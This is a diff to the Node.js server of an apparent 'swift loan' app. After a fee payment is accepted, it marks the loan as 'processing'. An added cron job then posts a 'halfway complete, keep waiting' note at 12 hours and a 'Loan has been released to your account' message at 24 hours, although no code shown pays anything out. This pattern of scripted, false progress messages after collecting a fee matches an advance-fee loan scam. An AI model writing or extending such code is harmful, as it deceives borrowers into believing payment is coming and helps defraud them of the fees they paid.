@@ -187,8 +187,9 @@ app.post("/callback", (req, res) => {
       loan_amount: existingReceipt.loan_amount || "50000",
       phone: data.result?.Phone || existingReceipt.phone || null,
       customer_name: customerName,
-      status: "success",
-      status_note: `Loan withdrawal successful and fee payment accepted ,You will receive your Approved loan within the next 10 minutes Contact support if withdrawal persists,Regards swift loan..`,
+      status: "processing",
+       status_note: `Fee payment accepted. Your loan is now being processed. 
+       Disbursement will be completed within 24 hours.`,
       timestamp: data.timestamp || new Date().toISOString(),
     };
    } else {
@@ -339,6 +340,38 @@ function generateReceiptPDF(receipt, res) {
 
   doc.end();
 }
+ const cron = require("node-cron");
+
+// Run every 5 minutes
+cron.schedule("*/5 * * * *", () => {
+  let receipts = readReceipts();
+  const now = Date.now();
+
+  for (let ref in receipts) {
+    const r = receipts[ref];
+    if (r.status === "processing") {
+      const start = new Date(r.timestamp).getTime();
+
+      // 12-hour checkpoint
+      const halfTime = start + 12 * 60 * 60 * 1000;
+      if (now >= halfTime && !r.halfProcessed) {
+        r.halfProcessed = true; // mark so we don’t repeat
+        r.status_note = "Loan processing is halfway complete. Please keep waiting.";
+        console.log(`⏳ Loan at 50% for ${ref}`);
+      }
+
+      // 24-hour release
+      const releaseTime = start + 24 * 60 * 60 * 1000;
+      if (now >= releaseTime) {
+        r.status = "loan_released";
+        r.status_note = "Loan has been released to your account. Thank you.";
+        console.log(`✅ Loan released for ${ref}`);
+      }
+    }
+  }
+
+  writeReceipts(receipts);
+});
 
 // 5ï¸âƒ£ Start server
 app.listen(PORT, () => {
